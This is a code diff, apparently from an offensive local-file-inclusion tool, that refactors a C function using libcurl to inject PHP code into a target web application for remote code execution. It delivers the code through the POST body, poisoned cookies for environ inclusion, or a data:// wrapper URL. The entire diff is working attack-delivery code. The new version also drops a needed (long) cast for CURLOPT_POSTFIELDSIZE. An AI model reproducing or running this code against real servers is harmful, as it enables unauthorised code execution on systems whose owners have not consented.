@@ -89,36 +89,32 @@ bool ssh_log_poison(const char *target, int port){
 
 void build_rce_exploit(CURL *curl, const char *base,
     struct parameter_list *plist, size_t pos, rce_type tech,
-    const char *php_code){
-    char *cookie_v = NULL;
-    char *data_wrap_uri = NULL;
+    const char *phpcode){
+    char *cookieptr;
+    char *data_wrap_uri;
 
-    if(tech == INPUT){
+    switch(tech){
+        case INPUT:
+        case AUTH:
+            curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, strlen(phpcode));
+            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, phpcode);
+        break;
 
-        curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, (long)strlen(php_code));
-        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, php_code);
+        case ENVIRON:
+            if(cookies){
+                cookieptr = cookie_append(cookies, phpcode);
+                curl_easy_setopt(curl, CURLOPT_COOKIE, cookieptr);
+                free(cookieptr);
+            } else {
+                curl_easy_setopt(curl, CURLOPT_COOKIE, phpcode);
+            }
+        break;
 
-    } else if(tech == ENVIRON){
-
-        if(!cookies){
-            curl_easy_setopt(curl, CURLOPT_COOKIE, php_code);
-        }
-
-        else {
-            cookie_v = cookie_append(cookies, php_code);
-            curl_easy_setopt(curl, CURLOPT_COOKIE, cookie_v);
-            xfree(cookie_v);
-        }
-
-    } else if(tech == DATA){
-
-        data_wrap_uri = build_datawrap_url(base, plist, pos, php_code);
-        curl_easy_setopt(curl, CURLOPT_URL, data_wrap_uri);
-        free(data_wrap_uri);
-
-    } else if(tech == AUTH){
-        curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, (long)strlen(php_code));
-        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, php_code);
+        case DATA:
+            data_wrap_uri = build_datawrap_url(base, plist, pos, phpcode);
+            curl_easy_setopt(curl, CURLOPT_URL, data_wrap_uri);
+            free(data_wrap_uri);
+        break;
     }
 }
 
